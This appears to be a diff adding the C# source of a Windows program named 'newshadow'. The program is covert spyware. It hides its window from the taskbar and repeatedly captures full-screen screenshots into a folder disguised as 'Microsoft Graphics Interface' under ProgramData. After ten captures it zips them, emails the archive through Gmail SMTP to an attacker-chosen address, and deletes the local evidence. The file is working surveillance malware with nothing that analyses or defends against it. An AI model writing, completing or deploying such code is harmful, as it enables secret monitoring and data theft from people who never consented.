@@ -1,0 +1,154 @@
+using System;
+using System.IO;
+using System.Drawing;
+using System.Net.Mail;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.IO.Compression;
+using System.Drawing.Imaging;
+
+namespace newshadow
+{
+    public partial class Form1 : Form
+    {
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                var Params = base.CreateParams;
+                Params.ExStyle |= 0x80;
+                return Params;
+            }
+        }
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            var Appdata = @"C:\ProgramData";
+            var MGI = $@"{Appdata}\Microsoft Graphics Interface";
+            var Packs = $@"{Appdata}\Microsoft Graphics Interface\Packs\";
+            var Surv = $@"{Appdata}\Microsoft Graphics Interface\Surv";
+            string Date = $"{DateTime.Now.ToString("dd MMMM -- HH mm ss")}";
+
+            try
+            {
+                if (Directory.Exists(MGI) == false)
+                {
+                    Directory.CreateDirectory(MGI);
+                    Directory.CreateDirectory(Surv);
+                    Directory.CreateDirectory(Packs);
+                }
+
+                if (Directory.GetFiles(Surv).Length < 10)
+                {
+                    try
+                    {
+
+                        int Width = Screen.PrimaryScreen.Bounds.Width;
+                        int Height = Screen.PrimaryScreen.Bounds.Height;
+
+                        Bitmap bt = new Bitmap(Width, Height);
+                        Graphics gfx = Graphics.FromImage((Image)bt);
+                        gfx.CopyFromScreen(0, 0, 0, 0, new Size(Width, Height));
+                        bt.Save($@"{Surv}\{Date}.jpg", ImageFormat.Jpeg);
+                        bt.Dispose();
+                        gfx.Dispose();
+                        //  Console.WriteLine("SS taken");
+                        timer1.Start();
+                    }
+                    catch (Exception runnu)
+                    {
+                        File.WriteAllText($@"{MGI}\Error3.txt", runnu.ToString());
+                        //   Console.WriteLine("Could not start SS");
+                    }
+
+                }
+                else
+                {
+                    timer2.Start();
+                }
+            }
+            catch (Exception ex)
+            {
+                File.WriteAllText($@"{MGI}\Error.txt", ex.ToString());
+                // Error in timer 1
+            }
+        }
+
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            var Appdata = @"C:\ProgramData";
+            var Packs = $@"{Appdata}\Microsoft Graphics Interface\Packs\";
+            var Surv = $@"{Appdata}\Microsoft Graphics Interface\Surv";
+
+            timer2.Stop();
+            if (Directory.Exists(Surv))
+            {
+                //   Console.WriteLine("Directory Found");
+            }
+
+            if (Directory.GetFiles($@"{Surv}").Length >= 10)
+            {
+                if (File.Exists($@"{Packs}\Datapack.zip") == false)
+                {
+                    ZipFile.CreateFromDirectory($@"{Surv}", $@"{Packs}\Datapack.zip");
+                }
+
+                var MGI = $@"{Appdata}\Microsoft Graphics Interface";
+
+                //   Console.WriteLine("Sending Mail...");
+                string Date = $"{DateTime.Now.ToString("dd MMMM")}";
+
+
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient(@"smtp.gmail.com");
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential(@"ENTER USERNAME", @"ENTER PASSWORD");
+                SmtpServer.EnableSsl = true;
+
+
+                mail.From = new MailAddress(@"SENDER EMAIL");
+                mail.To.Add(@"RECIPIENT EMAIL");
+                mail.Subject = $"Surveillence from {Date}";
+                mail.Body = $"The Folder is full.\n Here are the screenshots";
+                Stopwatch stopwatch = new Stopwatch();
+                stopwatch.Start();
+                mail.Attachments.Add(new Attachment($@"{Packs}\Datapack.zip"));
+                try
+                {
+                    SmtpServer.Send(mail);
+                }
+                catch (Exception ez)
+                {
+                    File.WriteAllText($@"{MGI}\Error2.txt", ez.ToString());
+                    //   Console.WriteLine("Could not Connect to server");
+                }
+                mail.Dispose();
+                stopwatch.Stop();
+                
+                //TimeSpan ts = stopwatch.Elapsed;
+                //Console.WriteLine($"Mail Sent in {ts} seconds!");
+
+
+                timer1.Stop();
+                DirectoryInfo di = new DirectoryInfo($@"{Surv}");
+                foreach (FileInfo File in di.GetFiles())
+                {
+                    File.Delete();
+                }
+                timer1.Start();
+                timer2.Stop();
+
+                File.Delete($@"{Packs}\Datapack.zip");
+
+            }
+        }
+    }
+}
